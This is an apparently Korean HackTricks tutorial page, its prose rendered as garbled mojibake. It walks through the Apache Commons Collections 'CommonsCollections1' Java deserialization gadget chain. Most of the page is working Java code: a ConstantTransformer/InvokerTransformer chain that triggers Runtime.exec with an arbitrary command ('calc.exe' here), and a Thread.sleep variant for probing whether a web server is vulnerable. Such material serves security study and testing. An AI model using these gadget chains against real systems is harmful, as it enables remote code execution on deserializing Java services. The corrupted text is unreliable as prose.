# CommonsCollection1 í˜ì´ë¡œë“œ - Java Transformersë¥¼ ì‚¬ìš©í•œ Rutime exec() ë° Thread Sleep

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ ì œë¡œì—ì„œ ì˜ì›…ê¹Œì§€ AWS í•´í‚¹ì„ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

* **ì‚¬ì´ë²„ ë³´ì•ˆ íšŒì‚¬**ì—ì„œ ì¼í•˜ì‹œë‚˜ìš”? **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ **í•˜ê±°ë‚˜ **PEASSì˜ ìµœì‹  ë²„ì „ì— ì•¡ì„¸ìŠ¤**í•˜ê±°ë‚˜ HackTricksë¥¼ **PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ìœ¼ì‹ ê°€ìš”? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•´ë³´ì„¸ìš”!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•´ë³´ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter**ì—ì„œ ì €ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš” ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **[hacktricks repo](https://github.com/carlospolop/hacktricks) ë° [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**ì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°ë²•ì„ ê³µìœ í•´ì£¼ì„¸ìš”.

</details>

## Java Transformersë¥¼ ì‚¬ìš©í•œ Rutime exec()

ì—¬ëŸ¬ ê³³ì—ì„œëŠ” ë‹¤ìŒê³¼ ê°™ì´ Apache common collectionsì˜ transformersë¥¼ ì‚¬ìš©í•˜ëŠ” ìë°” ì—­ì§ë ¬í™” í˜ì´ë¡œë“œë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```java
import org.apache.commons.*;
import org.apache.commons.collections.*;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.*;
import java.io.*;
import java.lang.reflect.InvocationTargetException;
import java.util.Map;
import java.util.HashMap;

public class CommonsCollections1PayloadOnly {
public static void main(String... args) {
String[] command = {"calc.exe"};
final Transformer[] transformers = new Transformer[]{
new ConstantTransformer(Runtime.class), //(1)
new InvokerTransformer("getMethod",
new Class[]{ String.class, Class[].class},
new Object[]{"getRuntime", new Class[0]}
), //(2)
new InvokerTransformer("invoke",
new Class[]{Object.class, Object[].class},
new Object[]{null, new Object[0]}
), //(3)
new InvokerTransformer("exec",
new Class[]{String.class},
command
) //(4)
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
Map map = new HashMap<>();
Map lazyMap = LazyMap.decorate(map, chainedTransformer);

//Execute gadgets
lazyMap.get("anything");
}
}
```
ë§Œì•½ ìë°” ì—­ì§ë ¬í™” í˜ì´ë¡œë“œì— ëŒ€í•´ ì•„ë¬´ê²ƒë„ ëª¨ë¥¸ë‹¤ë©´, ì´ ì½”ë“œê°€ calcë¥¼ ì‹¤í–‰í•˜ëŠ” ì´ìœ ë¥¼ ì´í•´í•˜ê¸° ì–´ë ¤ìš¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë¨¼ì € ì•Œì•„ì•¼ í•  ê²ƒì€ **ìë°”ì—ì„œì˜ Transformer**ëŠ” **í´ë˜ìŠ¤ë¥¼ ë°›ì•„ì„œ ë‹¤ë¥¸ í´ë˜ìŠ¤ë¡œ ë³€í™˜**í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.\
ë˜í•œ ì—¬ê¸°ì„œ **ì‹¤í–‰ë˜ëŠ” í˜ì´ë¡œë“œ**ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:
```java
Runtime.getRuntime().exec(new String[]{"calc.exe"});
```
ë˜ëŠ” **ë” ì •í™•íˆ ë§í•˜ë©´**, ìµœì¢…ì ìœ¼ë¡œ ì‹¤í–‰ë  ê²ƒì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:
```java
((Runtime) (Runtime.class.getMethod("getRuntime").invoke(null))).exec(new String[]{"calc.exe"});
```
### ì–´ë–»ê²Œ

ê·¸ë˜ì„œ, ì²« ë²ˆì§¸ í˜ì´ë¡œë“œëŠ” "ê°„ë‹¨í•œ" í•œ ì¤„ì§œë¦¬ í˜ì´ë¡œë“œì™€ ë™ë“±í•œ ê²ƒìœ¼ë¡œ ë‚˜íƒ€ë‚¼ ìˆ˜ ìˆëŠ” ë°©ë²•ì€ ì–´ë–¤ ê²ƒì¸ê°€ìš”?

**ì²« ë²ˆì§¸ë¡œ**, í˜ì´ë¡œë“œì—ì„œ **ë³€í™˜ì˜ ì²´ì¸(ë°°ì—´)ì´ ìƒì„±**ë˜ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```java
String[] command = {"calc.exe"};
final Transformer[] transformers = new Transformer[]{
//(1) - Get gadget Class (from Runtime class)
new ConstantTransformer(Runtime.class),

//(2) - Call from gadget Class (from Runtime class) the function "getMetod" to obtain "getRuntime"
new InvokerTransformer("getMethod",
new Class[]{ String.class, Class[].class},
new Object[]{"getRuntime", new Class[0]}
),

//(3) - Call from (Runtime) Class.getMethod("getRuntime") to obtain a Runtime oject
new InvokerTransformer("invoke",
new Class[]{Object.class, Object[].class},
new Object[]{null, new Object[0]}
),

//(4) - Use the Runtime object to call exec with arbitrary commands
new InvokerTransformer("exec",
new Class[]{String.class},
command
)
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
```
ì½”ë“œë¥¼ ì½ìœ¼ë©´ ë°°ì—´ì˜ ë³€í™˜ì„ ì—°ê²°í•˜ëŠ” ë°©ë²•ì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë ‡ê²Œ ì—°ê²°í•˜ë©´ ì„ì˜ì˜ ëª…ë ¹ì„ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ê·¸ë ‡ë‹¤ë©´, **ì´ëŸ¬í•œ ë³€í™˜ì€ ì–´ë–»ê²Œ ì—°ê²°ë˜ëŠ” ê±¸ê¹Œìš”?**
```java
Map map = new HashMap<>();
Map lazyMap = LazyMap.decorate(map, chainedTransformer);
lazyMap.get("anything");
```
ë§ˆì§€ë§‰ ì„¹ì…˜ì—ì„œ í˜ì´ë¡œë“œë¥¼ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. **Map ê°ì²´ê°€ ìƒì„±**ë©ë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ, `LazyMap`ì—ì„œ `decorate` í•¨ìˆ˜ê°€ ì‹¤í–‰ë˜ê³  ë§µ ê°ì²´ì™€ ì—°ê²°ëœ ë³€í™˜ê¸°ê°€ ì „ë‹¬ë©ë‹ˆë‹¤. ë‹¤ìŒ ì½”ë“œì—ì„œ ë³¼ ìˆ˜ ìˆë“¯ì´, ì´ë¡œ ì¸í•´ **ì—°ê²°ëœ ë³€í™˜ê¸°**ê°€ `lazyMap.factory` ì†ì„± ë‚´ì— ë³µì‚¬ë©ë‹ˆë‹¤.
```java
protected LazyMap(Map map, Transformer factory) {
super(map);
if (factory == null) {
throw new IllegalArgumentException("Factory must not be null");
}
this.factory = factory;
}
```
ê·¸ë¦¬ê³  ë§ˆì§€ë§‰ìœ¼ë¡œ ìœ„ëŒ€í•œ í”¼ë‚ ë ˆê°€ ì‹¤í–‰ë©ë‹ˆë‹¤: `lazyMap.get("anything");`

ë‹¤ìŒì€ `get` í•¨ìˆ˜ì˜ ì½”ë“œì…ë‹ˆë‹¤:
```java
public Object get(Object key) {
if (map.containsKey(key) == false) {
Object value = factory.transform(key);
map.put(key, value);
return value;
}
return map.get(key);
}
```
ê·¸ë¦¬ê³  ì´ê²ƒì€ `transform` í•¨ìˆ˜ì˜ ì½”ë“œì…ë‹ˆë‹¤.
```java
public Object transform(Object object) {
for (int i = 0; i < iTransformers.length; i++) {
object = iTransformers[i].transform(object);
}
return object;
}
```
ê·¸ë˜ì„œ, **factory** ì•ˆì—ëŠ” **`chainedTransformer`**ê°€ ì €ì¥ë˜ì–´ ìˆê³ , **`transform`** í•¨ìˆ˜ ì•ˆì—ì„œëŠ” **ëª¨ë“  ì—°ê²°ëœ transformerë¥¼ ìˆœíšŒí•˜ë©´ì„œ í•˜ë‚˜ì”© ì‹¤í–‰**í•©ë‹ˆë‹¤. ì¬ë¯¸ìˆëŠ” ì ì€ **ê° transformerê°€ ì…ë ¥ìœ¼ë¡œ `object`ë¥¼ ì‚¬ìš©**í•˜ê³  **objectëŠ” ë§ˆì§€ë§‰ìœ¼ë¡œ ì‹¤í–‰ëœ transformerì˜ ì¶œë ¥**ì…ë‹ˆë‹¤. ë”°ë¼ì„œ, **ëª¨ë“  ë³€í™˜ì€ ì•…ì„± í˜ì´ë¡œë“œë¥¼ ì‹¤í–‰í•˜ëŠ” ì—°ê²°ëœ ìƒíƒœ**ì…ë‹ˆë‹¤.

### ìš”ì•½

ë§ˆì§€ë§‰ìœ¼ë¡œ, lazyMapì´ get ë©”ì„œë“œ ë‚´ì—ì„œ ì—°ê²°ëœ transformerë¥¼ ê´€ë¦¬í•˜ëŠ” ë°©ì‹ ë•Œë¬¸ì—, ìš°ë¦¬ê°€ ë‹¤ìŒ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ëŠ” ê²ƒê³¼ ê°™ìŠµë‹ˆë‹¤:
```java
Object value = "someting";

value = new ConstantTransformer(Runtime.class).transform(value); //(1)

value = new InvokerTransformer("getMethod",
new Class[]{ String.class, Class[].class},
new Object[]{"getRuntime", null}
).transform(value); //(2)

value = new InvokerTransformer("invoke",
new Class[]{Object.class, Object[].class},
new Object[]{null, new Object[0]}
).transform(value); //(3)

value = new InvokerTransformer("exec",
new Class[]{String.class},
command
).transform(value); //(4)
```
_ê° ë³€í™˜ì˜ ì…ë ¥ì€ `value`ì´ë©° ì´ì „ ë³€í™˜ì˜ ì¶œë ¥ì´ê¸° ë•Œë¬¸ì— í•œ ì¤„ë¡œ ì‹¤í–‰í•  ìˆ˜ ìˆë‹¤ëŠ” ì ì— ì£¼ëª©í•˜ì„¸ìš”:_
```java
((Runtime) (Runtime.class.getMethod("getRuntime").invoke(null))).exec(new String[]{"calc.exe"});
```
ì—¬ê¸°ì—ì„œëŠ” **ComonsCollections1** í˜ì´ë¡œë“œì— ì‚¬ìš©ë˜ëŠ” ê°€ì ¯ë“¤ì— ëŒ€í•´ ì„¤ëª…ë˜ì—ˆìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ **ì´ ëª¨ë“  ê²ƒì´ ì–´ë–»ê²Œ ì‹¤í–‰ë˜ëŠ”ì§€ëŠ” ì„¤ëª…ë˜ì§€ ì•Šì•˜ìŠµë‹ˆë‹¤**. [ì—¬ê¸°ì—ì„œ **ysoserial**](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java)ì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ í˜ì´ë¡œë“œë¥¼ ì‹¤í–‰í•˜ê¸° ìœ„í•´ `AnnotationInvocationHandler` ê°ì²´ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. ì´ ê°ì²´ê°€ ì—­ì§ë ¬í™”ë  ë•Œ `payload.get()` í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ì—¬ ì „ì²´ í˜ì´ë¡œë“œë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤.

## Java Thread Sleep

ì´ í˜ì´ë¡œë“œëŠ” **ì›¹ì´ ì·¨ì•½í•œì§€ ì—¬ë¶€ë¥¼ í™•ì¸í•˜ëŠ” ë° ìœ ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì·¨ì•½í•˜ë‹¤ë©´ sleepì„ ì‹¤í–‰**í•©ë‹ˆë‹¤.
```java
import org.apache.commons.*;
import org.apache.commons.collections.*;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.*;
import java.io.*;
import java.lang.reflect.InvocationTargetException;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Map;
import java.util.HashMap;

public class CommonsCollections1Sleep {
public static void main(String... args) {
final Transformer[] transformers = new Transformer[]{
new ConstantTransformer(Thread.class),
new InvokerTransformer("getMethod",
new Class[]{
String.class, Class[].class
},
new Object[]{
"sleep", new Class[]{Long.TYPE}
}),
new InvokerTransformer("invoke",
new Class[]{
Object.class, Object[].class
}, new Object[]
{
null, new Object[] {7000L}
}),
};

ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
Map map = new HashMap<>();
Map lazyMap = LazyMap.decorate(map, chainedTransformer);

//Execute gadgets
lazyMap.get("anything");

}
}
```
## ë” ë§ì€ ê°€ì ¯

ë” ë§ì€ ê°€ì ¯ì€ ì—¬ê¸°ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤: [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)

##

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

* **ì‚¬ì´ë²„ ë³´ì•ˆ íšŒì‚¬**ì—ì„œ ì¼í•˜ì‹œë‚˜ìš”? **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê³  ì‹¶ìœ¼ì‹ ê°€ìš”**? ì•„ë‹ˆë©´ **PEASSì˜ ìµœì‹  ë²„ì „ì— ì•¡ì„¸ìŠ¤í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ìœ¼ì‹ ê°€ìš”? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•´ë³´ì„¸ìš”!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•´ë³´ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter**ì—ì„œ ì €ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš” ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **[hacktricks repo](https://github.com/carlospolop/hacktricks)ì™€ [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**ì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°êµë¥¼ ê³µìœ í•´ì£¼ì„¸ìš”.

</details>
